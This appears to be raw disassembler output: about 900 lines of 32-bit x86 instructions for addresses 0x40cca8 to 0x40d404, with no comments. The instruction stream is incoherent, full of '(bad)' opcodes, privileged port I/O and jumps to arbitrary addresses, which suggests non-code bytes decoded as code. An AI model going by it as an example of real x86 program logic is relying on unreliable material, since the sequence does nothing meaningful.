  40cca8:	bound  ebp,QWORD PTR ss:[eax]
  40ccab:	push   edx
  40ccac:	sti    
  40ccad:	xchg   ebx,eax
  40ccae:	mov    ss,ecx
  40ccb0:	sbb    eax,DWORD PTR [edx+0x73047843]
  40ccb6:	enter  0x9821,0x66
  40ccba:	int3   
  40ccbb:	jb     0x40cc4d
  40ccbd:	in     eax,0x5c
  40ccbf:	into   
  40ccc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccc1:	mov    edx,0x93d4e3c7
  40ccc6:	in     eax,0xc5
  40ccc8:	(bad)  
  40ccc9:	out    0x36,al
  40cccb:	jecxz  0x40ccd0
  40cccd:	out    0xe7,eax
  40cccf:	sub    bh,BYTE PTR [ecx]
  40ccd1:	in     al,0x49
  40ccd3:	dec    ebx
  40ccd4:	test   bh,ch
  40ccd6:	xchg   ebp,eax
  40ccd7:	sbb    eax,0x890b747
  40ccdc:	dec    eax
  40ccdd:	stos   BYTE PTR es:[edi],al
  40ccde:	ror    edi,1
  40cce0:	adc    eax,0x48a9c7b1
  40cce5:	inc    esi
  40cce6:	inc    ecx
  40cce7:	dec    ecx
  40cce8:	xchg   DWORD PTR [ebx+ebx*2],ecx
  40cceb:	mov    esi,0xae7dbf62
  40ccf0:	push   ss
  40ccf1:	xchg   DWORD PTR [esi],esi
  40ccf3:	mov    al,ds:0xfc7adb0b
  40ccf8:	push   edi
  40ccf9:	cmp    DWORD PTR [ecx+0x7e],0xe147085a
  40cd00:	std    
  40cd01:	xor    eax,0xe1ace017
  40cd06:	push   eax
  40cd07:	xchg   BYTE PTR [ebx],ch
  40cd09:	cmp    DWORD PTR [esi],esp
  40cd0b:	cmp    al,0x4d
  40cd0d:	int    0x49
  40cd0f:	fld    QWORD PTR [edx-0x7533bd63]
  40cd15:	push   cs
  40cd16:	pop    ds
  40cd17:	inc    edi
  40cd18:	jo     0x40ccea
  40cd1a:	es ja  0x40ccc2
  40cd1d:	mov    ds:0x153337f8,al
  40cd22:	(bad)  
  40cd23:	sbb    BYTE PTR [edi+0x513374c4],bh
  40cd29:	pop    ss
  40cd2a:	mov    ebx,0x36fbc78b
  40cd2f:	shl    BYTE PTR [edx],0xb9
  40cd32:	mov    eax,ds:0x3b177896
  40cd37:	push   cs
  40cd38:	cdq    
  40cd39:	aad    0x46
  40cd3b:	in     eax,dx
  40cd3c:	mov    ebp,0x6229548a
  40cd41:	xchg   esp,eax
  40cd42:	dec    ecx
  40cd43:	stc    
  40cd44:	cmc    
  40cd45:	hlt    
  40cd46:	xchg   ebp,eax
  40cd47:	call   FWORD PTR [edx-0xa]
  40cd4a:	cs repnz daa 
  40cd4d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40cd4f:	xor    al,al
  40cd51:	mov    DWORD PTR [ebx+0x740c7c20],ebx
  40cd57:	adc    BYTE PTR [esi],bl
  40cd59:	jmp    0x40cd9b
  40cd5b:	ss xor al,0xed
  40cd5e:	inc    ebp
  40cd5f:	xchg   esp,eax
  40cd60:	(bad)  
  40cd61:	out    0xe9,eax
  40cd63:	stc    
  40cd64:	inc    ebx
  40cd65:	xor    eax,0xbe05b65c
  40cd6a:	sbb    ah,dl
  40cd6c:	adc    al,0xab
  40cd6e:	adc    al,0x95
  40cd70:	shl    BYTE PTR [eax],1
  40cd72:	xchg   BYTE PTR [edx+0x53c2455d],cl
  40cd78:	clc    
  40cd79:	cmp    ch,bl
  40cd7b:	jge    0x40cd14
  40cd7d:	cdq    
  40cd7e:	nop
  40cd7f:	sar    DWORD PTR [ecx+0x555db18b],1
  40cd85:	lock push edx
  40cd87:	daa    
  40cd88:	sti    
  40cd89:	xlat   BYTE PTR ds:[ebx]
  40cd8a:	inc    esp
  40cd8b:	cld    
  40cd8c:	aas    
  40cd8d:	inc    edi
  40cd8e:	test   BYTE PTR [ebx+ecx*4-0x7e],bl
  40cd92:	and    DWORD PTR [esi-0x54337cd6],esp
  40cd98:	iret   
  40cd99:	mov    al,0xeb
  40cd9b:	mov    ebp,0x5be2f261
  40cda0:	cmp    ah,cl
  40cda2:	lds    ecx,FWORD PTR [edx-0x76]
  40cda5:	sub    eax,0xbc411cb8
  40cdaa:	ins    BYTE PTR es:[edi],dx
  40cdab:	push   ebx
  40cdac:	jmp    0xa0a4:0xe6225458
  40cdb3:	enter  0x2573,0xe5
  40cdb7:	scas   al,BYTE PTR es:[edi]
  40cdb8:	clc    
  40cdb9:	inc    esi
  40cdba:	jge    0x40cd43
  40cdbc:	je     0x40cdbe
  40cdbe:	shl    BYTE PTR [eax-0x6],cl
  40cdc1:	out    dx,eax
  40cdc2:	push   ebx
  40cdc3:	adc    DWORD PTR [ebx],0x5e
  40cdc6:	mov    dl,0xc6
  40cdc8:	mov    BYTE PTR [edx+esi*4+0x308e4dae],ah
  40cdcf:	jmp    0x40ce30
  40cdd1:	mov    dl,0x96
  40cdd3:	jge    0x40cdf7
  40cdd5:	out    0x4d,eax
  40cdd7:	adc    eax,0xb81f4333
  40cddd:	adc    bl,BYTE PTR [esi+0x3efcd21]
  40cde3:	cmp    al,0x22
  40cde5:	repnz sub DWORD PTR [ecx-0x6],eax
  40cde9:	xchg   ebx,eax
  40cdea:	lock push edi
  40cdec:	jecxz  0x40cdca
  40cdee:	xor    dl,BYTE PTR [ebp+0x6de487f3]
  40cdf4:	push   cs
  40cdf5:	push   esi
  40cdf6:	test   ebp,ebx
  40cdf8:	call   0x24b7:0x16c19369
  40cdff:	fst    QWORD PTR [ecx]
  40ce01:	call   0x307f1363
  40ce06:	imul   edx,DWORD PTR ds:0xd9456765,0xffffffd7
  40ce0d:	adc    al,ah
  40ce0f:	mov    eax,ds:0x284b3f77
  40ce14:	ret    
  40ce15:	inc    edx
  40ce16:	cmp    cl,bl
  40ce18:	or     eax,0x3b9ccb10
  40ce1d:	push   es
  40ce1e:	outs   dx,DWORD PTR ds:[esi]
  40ce1f:	jg     0x40ce04
  40ce21:	in     al,0xab
  40ce23:	add    al,0xc3
  40ce25:	std    
  40ce26:	rol    BYTE PTR [ebp+0x4d916c43],1
  40ce2c:	push   0x76d0a1e4
  40ce31:	push   0xb9eab1d0
  40ce36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce37:	test   DWORD PTR [ebp+0x205c130c],0xf5ad302
  40ce41:	mov    edi,0x8757b640
  40ce46:	xchg   DWORD PTR [ecx+ebp*4-0x47],esi
  40ce4a:	sbb    BYTE PTR [eax+eax*2],cl
  40ce4d:	add    ah,bh
  40ce4f:	rcr    DWORD PTR [esi+0x1c],0xf9
  40ce53:	ret    
  40ce54:	mov    eax,ds:0xa4293599
  40ce59:	cld    
  40ce5a:	xchg   esi,edi
  40ce5c:	stos   DWORD PTR es:[edi],eax
  40ce5d:	arpl   WORD PTR [edx],bp
  40ce5f:	mov    ebp,0x72927984
  40ce64:	cdq    
  40ce65:	or     dh,0xf2
  40ce68:	pushf  
  40ce69:	mov    esp,0x1d644946
  40ce6e:	xchg   ebx,eax
  40ce6f:	add    DWORD PTR [esi-0x51],edi
  40ce72:	xchg   ebx,eax
  40ce73:	in     al,0x1
  40ce75:	mov    al,0xad
  40ce77:	xchg   DWORD PTR [ecx+0x1f],eax
  40ce7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce7b:	cs (bad) 
  40ce7d:	fistp  QWORD PTR [esi-0x2d]
  40ce80:	lock test al,0xf4
  40ce83:	sbb    ah,BYTE PTR [edx-0x1fa2bac4]
  40ce89:	and    dl,BYTE PTR [esi+0x61]
  40ce8c:	les    esp,FWORD PTR [ebp-0x25e259cb]
  40ce92:	je     0x40ceca
  40ce94:	xchg   esp,eax
  40ce95:	fwait
  40ce96:	pop    ds
  40ce97:	push   ss
  40ce98:	retf   0x8aac
  40ce9b:	test   DWORD PTR [ebp-0x6b5543cc],ebx
  40cea1:	mov    al,ds:0x6e57de76
  40cea6:	mov    si,0x937b
  40ceaa:	les    eax,FWORD PTR [esi+ecx*8+0x22773434]
  40ceb1:	repnz (bad) 
  40ceb3:	std    
  40ceb4:	iret   
  40ceb5:	fwait
  40ceb6:	and    eax,0xecbe26ce
  40cebb:	jb     0x40ceef
  40cebd:	add    cl,ch
  40cebf:	jg     0x40cee4
  40cec1:	add    BYTE PTR [eax],al
  40cec3:	mov    cs:0xd0afdcaf,eax
  40cec9:	add    DWORD PTR [ebx+0x287882c5],eax
  40cecf:	inc    edi
  40ced0:	add    al,0x35
  40ced2:	std    
  40ced3:	lods   eax,DWORD PTR ds:[esi]
  40ced4:	int    0x7a
  40ced6:	jp     0x40ceeb
  40ced8:	pop    edi
  40ced9:	jp     0x40cf55
  40cedb:	jno    0x40ce73
  40cedd:	(bad)  
  40cedf:	or     eax,0x6e5bd0ca
  40cee4:	sbb    ecx,DWORD PTR [ebp+0x71c1ce2c]
  40ceea:	call   0x54b9e737
  40ceef:	and    ax,0xd6e
  40cef3:	lahf   
  40cef4:	and    BYTE PTR [eax+eiz*2+0x3e],ah
  40cef8:	push   0xa36deae7
  40cefd:	stc    
  40cefe:	jl     0x40cf4c
  40cf00:	fnstenv [esi+0x6a]
  40cf03:	adc    al,cl
  40cf05:	lea    ebx,ds:0xb3ccbdb0
  40cf0b:	jb     0x40cf07
  40cf0d:	ret    0x5a4
  40cf10:	xchg   edx,eax
  40cf11:	and    BYTE PTR [edi],ch
  40cf13:	inc    edi
  40cf14:	add    al,0xfd
  40cf16:	leave  
  40cf17:	pop    es
  40cf18:	stos   DWORD PTR es:[edi],eax
  40cf19:	cmp    esi,ebp
  40cf1b:	xor    ah,BYTE PTR [edi+0x251f66f]
  40cf21:	sbb    al,0xcd
  40cf23:	clc    
  40cf24:	inc    ecx
  40cf25:	lods   al,BYTE PTR ds:[esi]
  40cf26:	ds or  edi,eax
  40cf29:	aam    0xe1
  40cf2b:	and    BYTE PTR [ebx-0x46],bh
  40cf2e:	mov    al,ds:0x435d9ef5
  40cf33:	jb     0x40cfab
  40cf35:	adc    BYTE PTR [ebx+0x6b],al
  40cf38:	sahf   
  40cf39:	repz pop edi
  40cf3b:	lods   eax,DWORD PTR ds:[esi]
  40cf3c:	bndstx [edi-0x58],bnd3
  40cf40:	arpl   WORD PTR [esi],si
  40cf42:	jp     0x40cf23
  40cf44:	sub    ebx,DWORD PTR [eax+esi*2]
  40cf47:	sahf   
  40cf48:	jns    0x40cf70
  40cf4a:	lahf   
  40cf4b:	add    eax,0x760e4b26
  40cf50:	sbb    eax,0xe2d81e0e
  40cf55:	js     0x40cfc9
  40cf57:	add    al,0x14
  40cf59:	xor    al,0x46
  40cf5b:	or     DWORD PTR [ebx-0x7e],ebx
  40cf5e:	and    BYTE PTR [edi+0x54727ec0],ch
  40cf64:	dec    ebp
  40cf65:	jmp    0x139eecc7
  40cf6a:	mov    ch,0xb3
  40cf6c:	ja     0x40cef4
  40cf6e:	cwde   
  40cf6f:	push   ebp
  40cf70:	xchg   esi,eax
  40cf71:	outs   dx,BYTE PTR ds:[esi]
  40cf72:	cmc    
  40cf73:	mov    dl,0xd1
  40cf75:	mov    edx,0xbe9d7f62
  40cf7a:	shr    BYTE PTR [edi],0x91
  40cf7d:	pop    eax
  40cf7e:	pop    ss
  40cf7f:	scas   al,BYTE PTR es:[edi]
  40cf80:	fild   DWORD PTR [edx+0x68]
  40cf83:	push   0xffffffbd
  40cf85:	pop    ecx
  40cf86:	push   ebx
  40cf87:	dec    edx
  40cf88:	fs in  eax,dx
  40cf8a:	add    al,0x65
  40cf8c:	push   es
  40cf8d:	stos   DWORD PTR es:[edi],eax
  40cf8e:	test   al,0x9c
  40cf90:	mov    cl,0xdd
  40cf92:	fist   DWORD PTR [esi]
  40cf94:	aaa    
  40cf95:	out    dx,al
  40cf96:	push   ecx
  40cf97:	cdq    
  40cf98:	push   cs
  40cf99:	pop    eax
  40cf9a:	ins    DWORD PTR es:[edi],dx
  40cf9b:	fisubr DWORD PTR [ebx]
  40cf9d:	loopne 0x40cfc2
  40cf9f:	loop   0x40cf94
  40cfa1:	repz enter 0x3cdb,0x59
  40cfa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfa7:	in     eax,0xe1
  40cfa9:	sub    eax,0x4767e0e8
  40cfae:	sub    dl,BYTE PTR [edi-0x74c88a37]
  40cfb4:	mov    bh,0x45
  40cfb6:	sub    eax,0xebf8324f
  40cfbb:	jb     0x40d037
  40cfbd:	xchg   ebx,eax
  40cfbe:	and    BYTE PTR [eax+0x6f],ah
  40cfc1:	ins    DWORD PTR es:[edi],dx
  40cfc2:	rol    DWORD PTR [esi],1
  40cfc4:	and    eax,eax
  40cfc6:	mov    eax,0xb5ea138f
  40cfcb:	jp     0x40cf72
  40cfcd:	loop   0x40d04e
  40cfcf:	xchg   esi,eax
  40cfd0:	xchg   ebx,eax
  40cfd1:	sar    DWORD PTR [ecx+0x4d],0x41
  40cfd5:	jb     0x40d007
  40cfd7:	push   ecx
  40cfd8:	fisubr WORD PTR [edi+0x7e]
  40cfdb:	loope  0x40cfcb
  40cfdd:	mov    ?,WORD PTR [ebp-0x22]
  40cfe0:	pusha  
  40cfe1:	aas    
  40cfe2:	add    edx,esp
  40cfe4:	mov    ds:0xe75677a2,al
  40cfe9:	push   esp
  40cfea:	hlt    
  40cfeb:	push   ds
  40cfec:	js     0x40d01f
  40cfee:	push   eax
  40cfef:	xchg   DWORD PTR [ebp-0x36],eax
  40cff2:	adc    DWORD PTR [esi-0x35e74d2b],ebp
  40cff8:	imul   BYTE PTR [ecx-0x6c96d5d2]
  40cffe:	lods   al,BYTE PTR ds:[esi]
  40cfff:	cmp    ebx,DWORD PTR [ebx+0x46361868]
  40d005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d006:	jp     0x40cfba
  40d008:	xor    ebp,DWORD PTR [esi+0x42]
  40d00b:	inc    ebp
  40d00c:	mov    ebx,0xa690b100
  40d011:	sub    bl,al
  40d013:	xor    eax,0xbeb1bfbf
  40d018:	pop    esp
  40d019:	xchg   esp,eax
  40d01a:	aaa    
  40d01b:	cs dec esp
  40d01d:	ins    DWORD PTR es:[edi],dx
  40d01e:	push   esp
  40d01f:	popf   
  40d020:	cs pop esp
  40d022:	jbe    0x40cfa8
  40d024:	lods   eax,DWORD PTR ds:[esi]
  40d025:	dec    esi
  40d026:	push   cs
  40d027:	jecxz  0x40cfaf
  40d029:	mov    ecx,0xa4a2b07b
  40d02e:	mov    bl,0x62
  40d030:	cmp    edi,0x1f
  40d033:	imul   eax,DWORD PTR [ecx],0x897aac5a
  40d039:	aam    0x17
  40d03b:	loopne 0x40d060
  40d03d:	out    0x8e,al
  40d03f:	push   ss
  40d040:	xor    al,BYTE PTR [ebx]
  40d042:	xor    ch,al
  40d044:	pushf  
  40d045:	lods   al,BYTE PTR ds:[esi]
  40d046:	inc    esp
  40d047:	add    bh,cl
  40d049:	push   ss
  40d04a:	leave  
  40d04b:	jns    0x40d091
  40d04d:	lods   eax,DWORD PTR ds:[esi]
  40d04e:	push   ebx
  40d04f:	mov    esi,0xb5f3a89f
  40d054:	mov    ebx,DWORD PTR [edx+0x18]
  40d057:	std    
  40d058:	loopne 0x40d077
  40d05a:	push   0x730e8802
  40d05f:	dec    esi
  40d060:	cmp    eax,0x89adbe4b
  40d065:	pop    esp
  40d066:	push   ss
  40d067:	add    BYTE PTR [edi-0x3ddbb1bf],0x50
  40d06e:	mov    al,ds:0x3ffefffe
  40d073:	mov    al,BYTE PTR [ebx+edx*2+0x2b]
  40d077:	daa    
  40d078:	icebp  
  40d079:	cwde   
  40d07a:	xor    eax,0xb5cdf619
  40d07f:	dec    ebx
  40d080:	and    DWORD PTR [esi-0x4d2db6d],ebp
  40d086:	and    cl,BYTE PTR [edi+0x62f72439]
  40d08c:	imul   edi
  40d08e:	dec    eax
  40d08f:	xlat   BYTE PTR ds:[ebx]
  40d090:	ja     0x40d0a0
  40d092:	or     bh,ch
  40d094:	les    ebx,FWORD PTR [ebp+0x3b]
  40d097:	iret   
  40d098:	or     al,0x3a
  40d09a:	bound  esp,QWORD PTR [ebx-0x54]
  40d09d:	shl    DWORD PTR [edx+0x614371eb],0xce
  40d0a4:	mov    al,0xb0
  40d0a6:	test   BYTE PTR gs:[ebx],cl
  40d0a9:	ret    0xd55a
  40d0ac:	pop    ss
  40d0ad:	push   ecx
  40d0ae:	jg     0x40d0a2
  40d0b0:	scas   eax,DWORD PTR es:[edi]
  40d0b1:	aad    0xb3
  40d0b3:	fcmovnbe st,st(2)
  40d0b5:	and    BYTE PTR [edi+0x16],bl
  40d0b8:	lds    esp,FWORD PTR [ebx+edi*2-0x63b1e83e]
  40d0bf:	push   0x2b402042
  40d0c4:	scas   al,BYTE PTR es:[edi]
  40d0c5:	mov    ah,BYTE PTR [esi-0x173367a1]
  40d0cb:	push   esp
  40d0cc:	and    eax,0xd85ed9aa
  40d0d1:	adc    dh,dl
  40d0d3:	dec    ebx
  40d0d4:	mov    bh,BYTE PTR [ebp+esi*2+0x2adec21c]
  40d0db:	cdq    
  40d0dc:	push   ebp
  40d0dd:	jge    0x40d134
  40d0df:	cs cs add eax,0x9c6156fe
  40d0e6:	xlat   BYTE PTR ds:[ebx]
  40d0e7:	jbe    0x40d13c
  40d0e9:	push   ecx
  40d0ea:	adc    BYTE PTR [edx],0x3f
  40d0ed:	fwait
  40d0ee:	xchg   ecx,eax
  40d0ef:	int    0x3c
  40d0f1:	mov    edi,0x5db8118c
  40d0f6:	int    0xd6
  40d0f8:	xchg   edi,eax
  40d0f9:	sbb    eax,DWORD PTR [ebx-0x526a73c9]
  40d0ff:	adc    eax,0xb39119a3
  40d104:	das    
  40d105:	mov    ecx,0x38cec1e2
  40d10a:	and    BYTE PTR [edi-0x14ee1c54],bh
  40d110:	sub    ecx,DWORD PTR [ebx-0x58]
  40d113:	xchg   esp,eax
  40d114:	jne    0x40d132
  40d116:	data16 fld TBYTE PTR [edi+edx*4-0x32]
  40d11b:	sub    al,0x53
  40d11d:	push   esi
  40d11e:	mov    ch,0x23
  40d120:	ja     0x40d19f
  40d122:	fwait
  40d123:	pxor   mm7,QWORD PTR [edx-0x4f]
  40d127:	push   es
  40d128:	cmp    edx,DWORD PTR [edx]
  40d12a:	sub    DWORD PTR [esi+0x6347cdc2],esi
  40d130:	dec    ebp
  40d131:	ins    BYTE PTR es:[edi],dx
  40d132:	inc    edx
  40d133:	push   edx
  40d134:	icebp  
  40d135:	push   cs
  40d136:	daa    
  40d137:	adc    ebx,0x102f99c8
  40d13d:	das    
  40d13e:	hlt    
  40d13f:	cmp    al,0xa6
  40d141:	sbb    edx,DWORD PTR [eax+0x5a]
  40d144:	mov    ch,0x8e
  40d146:	jmp    0xd4aa9369
  40d14b:	int3   
  40d14c:	sbb    DWORD PTR [edi],edx
  40d14e:	mov    bl,0x8d
  40d150:	arpl   WORD PTR [edi+0x79],ax
  40d153:	cwde   
  40d154:	and    ebp,DWORD PTR [eax]
  40d156:	adc    esp,DWORD PTR [ebx-0x6e]
  40d159:	sub    DWORD PTR [edi+0x48],eax
  40d15c:	stc    
  40d15d:	jge    0x40d19a
  40d15f:	je     0x40d1c7
  40d161:	jmp    0xc41d8daa
  40d166:	cmp    esi,edx
  40d168:	fstp   st(7)
  40d16a:	(bad)  
  40d16b:	out    0x1b,al
  40d16d:	xor    al,0x7d
  40d16f:	xor    ebp,DWORD PTR [esi+0x37]
  40d172:	mov    al,ds:0x5fd0eb22
  40d177:	loopne 0x40d181
  40d179:	sub    bh,cl
  40d17b:	add    edi,DWORD PTR [ecx]
  40d17d:	mov    ds:0x767d3191,eax
  40d182:	and    ah,BYTE PTR [eax]
  40d184:	jl     0x40d10c
  40d186:	xchg   edx,eax
  40d187:	adc    eax,0x681ef888
  40d18c:	lahf   
  40d18d:	cld    
  40d18e:	test   DWORD PTR [ebp-0x18],0x4ebe1a8a
  40d195:	out    dx,eax
  40d196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d197:	popf   
  40d198:	mov    eax,ds:0x42e7d0eb
  40d19d:	pop    edi
  40d19e:	xor    ah,dh
  40d1a0:	or     dh,ch
  40d1a2:	or     ah,BYTE PTR [edx+ebx*1]
  40d1a5:	jae    0x40d170
  40d1a7:	aaa    
  40d1a8:	and    ch,BYTE PTR [esi+0x6ec52128]
  40d1ae:	and    bh,ah
  40d1b0:	xor    al,bh
  40d1b2:	pop    eax
  40d1b3:	mov    dh,0xeb
  40d1b5:	or     eax,0x96ee34a9
  40d1ba:	call   0xcf65984b
  40d1bf:	xor    eax,0xb097b363
  40d1c4:	xchg   edi,eax
  40d1c5:	aas    
  40d1c6:	adc    eax,0x37aa9b8d
  40d1cb:	add    al,0xf2
  40d1cd:	cdq    
  40d1ce:	inc    ecx
  40d1cf:	shl    DWORD PTR ss:[eax+0x40],0xd0
  40d1d4:	mov    ecx,0x49032516
  40d1d9:	aam    0x19
  40d1db:	test   BYTE PTR fs:[ebx+0x22],dh
  40d1df:	inc    ebp
  40d1e0:	ins    DWORD PTR es:[edi],dx
  40d1e1:	pop    eax
  40d1e2:	xor    ah,ch
  40d1e4:	pop    esi
  40d1e5:	cld    
  40d1e6:	jmp    0x432c87aa
  40d1eb:	inc    edi
  40d1ec:	jb     0x40d25c
  40d1ee:	jp     0x40d240
  40d1f0:	mov    DWORD PTR [esi],edi
  40d1f2:	nop
  40d1f3:	adc    BYTE PTR [ebp+esi*8-0x5bde0b94],al
  40d1fa:	stos   DWORD PTR es:[edi],eax
  40d1fb:	sbb    al,0xb6
  40d1fd:	mov    DWORD PTR [edx+0x259179a6],ebp
  40d203:	(bad)  [edx-0x5a]
  40d206:	cld    
  40d207:	popa   
  40d208:	int    0x48
  40d20a:	fistp  WORD PTR es:[edx]
  40d20d:	or     al,0x1d
  40d20f:	in     eax,0x13
  40d211:	inc    ebp
  40d212:	ins    BYTE PTR es:[edi],dx
  40d213:	add    bh,ch
  40d215:	into   
  40d216:	es dec ebx
  40d218:	sbb    eax,0x4c0774d7
  40d21d:	(bad)  
  40d21e:	fs pop ebx
  40d220:	or     BYTE PTR [eax-0x4bef1263],bl
  40d226:	cwde   
  40d227:	daa    
  40d228:	dec    ecx
  40d229:	lods   al,BYTE PTR ds:[esi]
  40d22a:	adc    al,0x15
  40d22c:	pop    ebp
  40d22d:	push   edx
  40d22e:	data16 jecxz 0x40d23c
  40d231:	leave  
  40d232:	adc    bh,BYTE PTR [eax+0x48]
  40d235:	int3   
  40d236:	sbb    edx,DWORD PTR [ebx+0x6c]
  40d239:	cmp    ah,BYTE PTR [eax+0xf]
  40d23c:	sbb    eax,0x15c5bc96
  40d241:	aad    0xd7
  40d243:	jne    0x40d256
  40d245:	loop   0x40d26a
  40d247:	fwait
  40d248:	or     cl,BYTE PTR [eax+0x65]
  40d24b:	aas    
  40d24c:	out    0x46,eax
  40d24e:	mov    dh,0x1
  40d250:	loopne 0x40d20f
  40d252:	sub    ecx,esi
  40d254:	inc    esp
  40d255:	ins    DWORD PTR es:[edi],dx
  40d256:	das    
  40d257:	and    BYTE PTR [ecx*2+0x6a5cc8d1],ch
  40d25e:	xchg   edi,eax
  40d25f:	pop    ss
  40d260:	mov    esi,0x28e00c97
  40d265:	out    dx,eax
  40d266:	jmp    0x40d268
  40d268:	cmp    DWORD PTR [eax-0x69],ecx
  40d26b:	pop    ecx
  40d26c:	mov    ah,0x45
  40d26e:	ret    0x8cdd
  40d271:	pop    ss
  40d272:	adc    DWORD PTR [eax+edi*2],esi
  40d275:	xor    eax,0xa89f992b
  40d27a:	mov    WORD PTR [edx],?
  40d27c:	call   0x57de54c6
  40d281:	pop    ds
  40d282:	pop    esi
  40d283:	adc    BYTE PTR [ecx+0x6e4f51ee],ah
  40d289:	enter  0xfc32,0x15
  40d28d:	std    
  40d28e:	ss jmp 0x6c5e5dd8
  40d294:	(bad)  
  40d295:	mov    dh,0x24
  40d297:	push   0x6e
  40d299:	mov    al,ds:0x750a6a16
  40d29e:	pusha  
  40d29f:	(bad)  
  40d2a2:	std    
  40d2a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2a4:	cdq    
  40d2a5:	push   edi
  40d2a6:	add    cl,dh
  40d2a8:	test   BYTE PTR [ecx+0xb32b1d3],dl
  40d2ae:	pop    ecx
  40d2af:	and    ebx,DWORD PTR [edi+ecx*8+0x62]
  40d2b3:	mov    dl,0x86
  40d2b5:	cwde   
  40d2b6:	paddq  mm4,mm2
  40d2b9:	inc    edi
  40d2ba:	jnp    0x40d2bc
  40d2bc:	sbb    dl,bl
  40d2be:	sti    
  40d2bf:	jbe    0x40d327
  40d2c1:	jle    0x40d2ad
  40d2c3:	mov    ch,BYTE PTR [edi]
  40d2c5:	adc    esi,esi
  40d2c7:	popf   
  40d2c8:	ins    DWORD PTR es:[edi],dx
  40d2c9:	or     eax,0xb2cde58a
  40d2ce:	ins    BYTE PTR es:[edi],dx
  40d2cf:	shr    BYTE PTR ds:[ecx],0x2c
  40d2d3:	icebp  
  40d2d4:	arpl   WORD PTR [eax+0x79851d1b],si
  40d2da:	adc    BYTE PTR [eax+0x59f67cd6],dh
  40d2e0:	inc    ebp
  40d2e1:	ss popa 
  40d2e3:	loopne 0x40d2cc
  40d2e5:	mov    dl,0x88
  40d2e7:	inc    eax
  40d2e8:	aam    0x34
  40d2ea:	div    BYTE PTR [ebx+0xe]
  40d2ed:	jmp    0xa747d83d
  40d2f2:	jecxz  0x40d2d3
  40d2f4:	inc    ebx
  40d2f5:	dec    edi
  40d2f6:	lahf   
  40d2f7:	push   esp
  40d2f8:	aad    0x0
  40d2fa:	xchg   edi,eax
  40d2fb:	lods   al,BYTE PTR ds:[esi]
  40d2fc:	adc    esp,DWORD PTR [esi+0x17]
  40d2ff:	repnz dec edi
  40d301:	fld    TBYTE PTR ds:0xdae9427e
  40d307:	sub    DWORD PTR [ebx],ebp
  40d309:	fsubr  QWORD PTR [esi+eax*1]
  40d30c:	scas   al,BYTE PTR es:[edi]
  40d30d:	shl    BYTE PTR [esi],1
  40d30f:	rcl    DWORD PTR ds:0x5d87a39a,0x76
  40d316:	mov    al,0xa9
  40d318:	pop    edx
  40d319:	ret    
  40d31a:	sub    BYTE PTR [edx-0x15],cl
  40d31d:	sbb    bl,BYTE PTR [edx-0x4f]
  40d320:	lea    esi,[ebx+0x5c872a32]
  40d326:	inc    eax
  40d327:	or     DWORD PTR [esi],0x4cc0fe93
  40d32d:	pop    esi
  40d32e:	dec    edx
  40d32f:	push   edx
  40d330:	(bad)  
  40d331:	in     al,dx
  40d332:	rcr    BYTE PTR [eax],0x20
  40d335:	fdiv   QWORD PTR [esi]
  40d337:	loope  0x40d3b5
  40d339:	xor    ah,al
  40d33b:	inc    ebx
  40d33c:	inc    eax
  40d33d:	stos   BYTE PTR es:[edi],al
  40d33e:	in     al,0x3e
  40d340:	pop    es
  40d341:	bound  ebx,QWORD PTR [ecx+ecx*1+0x3d57cc0b]
  40d348:	sbb    DWORD PTR [ebx+eax*1+0x38],esp
  40d34c:	jo     0x40d3b2
  40d34e:	xchg   esp,eax
  40d34f:	aas    
  40d350:	sti    
  40d351:	mov    ch,0x7b
  40d353:	mov    ecx,0x94127866
  40d358:	or     eax,0x357cc392
  40d35d:	mov    cl,0xef
  40d35f:	jns    0x40d38a
  40d361:	test   BYTE PTR [ebx],0x6a
  40d364:	mov    eax,esp
  40d366:	dec    eax
  40d367:	sti    
  40d368:	add    dh,BYTE PTR [ebx+0x43]
  40d36b:	adc    al,0x61
  40d36d:	mov    edx,0x176ed440
  40d372:	bsr    ebx,edi
  40d375:	xchg   edx,eax
  40d376:	pop    ebp
  40d377:	jmp    0x2930308d
  40d37c:	push   ss
  40d37d:	lea    edi,[edx+0x40b52353]
  40d383:	frstor [ebx-0x61320b0a]
  40d389:	imul   esi,edi,0xffffffcf
  40d38c:	in     al,0x7
  40d38e:	and    eax,0xfe476b9a
  40d393:	and    BYTE PTR [ebx-0x27],ch
  40d396:	jecxz  0x40d359
  40d398:	out    dx,eax
  40d399:	scas   al,BYTE PTR es:[edi]
  40d39a:	sub    eax,0xf6829267
  40d39f:	pop    edx
  40d3a0:	adc    dh,dl
  40d3a2:	sbb    BYTE PTR [ecx],al
  40d3a4:	mov    ebp,0xd4eb9f4f
  40d3a9:	data16 je 0x40d3ec
  40d3ac:	(bad)
  40d3b0:	mov    ss,edi
  40d3b2:	jmp    0x40d3be
  40d3b4:	pop    edx
  40d3b5:	xchg   DWORD PTR [edi-0x6a],ebx
  40d3b8:	frstor [eax+0x1d8e80fe]
  40d3be:	pop    esi
  40d3bf:	jno    0x40d3df
  40d3c1:	push   esi
  40d3c2:	pop    ds
  40d3c3:	inc    ecx
  40d3c4:	addr16 loope 0x40d41b
  40d3c7:	adc    ecx,edi
  40d3c9:	in     eax,dx
  40d3ca:	mov    bl,0x49
  40d3cc:	sbb    ebx,0x998fd93f
  40d3d2:	jl     0x40d3dc
  40d3d4:	mov    ah,BYTE PTR [edx+0x0]
  40d3d7:	push   ds
  40d3d8:	push   0x6fa0e25b
  40d3dd:	ror    ebx,1
  40d3df:	xchg   BYTE PTR [ebp-0x1f25dfb2],cl
  40d3e5:	add    edi,DWORD PTR [edi-0x3d]
  40d3e8:	fsub   QWORD PTR [ecx]
  40d3ea:	sti    
  40d3eb:	sbb    ch,BYTE PTR [ebx+0x26]
  40d3ee:	xchg   esi,eax
  40d3ef:	mov    cl,0x9
  40d3f1:	add    dh,bl
  40d3f3:	pop    ss
  40d3f4:	add    edi,DWORD PTR [ebp+0x58]
  40d3f7:	mov    BYTE PTR [eax-0x401c082],bl
  40d3fd:	jmp    0x76cbab79
  40d402:	je     0x40d3d8
  40d404:	stc    
